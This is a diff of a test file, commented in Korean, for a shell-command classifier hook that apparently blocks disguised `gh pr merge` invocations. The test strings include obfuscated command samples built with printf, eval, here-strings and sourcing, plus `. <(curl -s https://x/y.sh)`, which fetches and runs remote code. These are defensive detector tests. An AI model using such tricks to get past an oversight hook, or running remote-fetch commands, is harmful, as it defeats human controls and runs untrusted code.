@@ -268,14 +268,19 @@ describe('classifyHookInput — 3분류(pass/blocked/merge)', () => {
     // 44R: here-string/here-doc 피연산자는 스크립트 파일 인자가 아니다 — stdin 으로 차단
     expect(classify('bash <<< "$(printf \'g%c pr m%crge --help\' h e)"').kind).toBe('blocked')
     expect(classify('sh <<EOF\ngh pr merge 222\nEOF').kind).toBe('blocked')
-    // 진짜 스크립트 파일 인자는 stdin 아님 — 리다이렉션과 구분한다
-    expect(classify('bash deploy.sh')).toEqual({ kind: 'pass' })
-    expect(classify('sh /tmp/x.sh arg1')).toEqual({ kind: 'pass' })
-    // 46R: source/. 가 process substitution·동적 입력을 소싱하면 관측 불가로 차단
+    // 50R: 외부 스크립트 파일도 내용 관측 불가(TOCTOU)라 -c 없는 인터프리터는 전부 차단
+    expect(classify('bash deploy.sh').kind).toBe('blocked')
+    expect(classify('sh /tmp/x.sh arg1').kind).toBe('blocked')
+    // 46R·50R: source/. 는 파일·process-sub·동적 어느 소싱도 관측 불가라 차단
     expect(classify("source <(printf 'g%c pr m%crge 222 --squash' h e)").kind).toBe('blocked')
     expect(classify('. <(curl -s https://x/y.sh)').kind).toBe('blocked')
-    expect(classify('. "$DYNAMIC"').kind).toBe('pass') // 인용 변수 경로는 워드분할 불가 — 통과
-    expect(classify('. /tmp/env.sh')).toEqual({ kind: 'pass' }) // 정적 파일 소싱은 통과
+    expect(classify('. "$DYNAMIC"').kind).toBe('blocked')
+    expect(classify('. /tmp/env.sh').kind).toBe('blocked')
+    // 50R: 동적 조립기 피연산자(`xargs "$CLI"`)도 관측 불가로 차단
+    expect(classify('printf \'pr m%crge --help\' e | xargs "$CLI"').kind).toBe('blocked')
+    expect(classify('ls | xargs rm').kind).toBe('pass') // gh·동적 무관 조립은 통과
+    // 50R: `command -- eval …` 의 `--` 종결자를 값으로 소비하지 않는다
+    expect(classify('command -- eval "printf \'g%c pr m%crge\' h e | sh"').kind).toBe('blocked')
     // 48R: eval 은 인자를 합쳐 실행 — 동적이면 관측 불가, 리터럴이면 재분류
     expect(classify('eval "$(printf \'g%c pr m%crge 222 --squash\' h e)"').kind).toBe('blocked')
     expect(classify('eval "gh pr merge 222"').kind).toBe('blocked') // 리터럴 재분류 → 비canonical
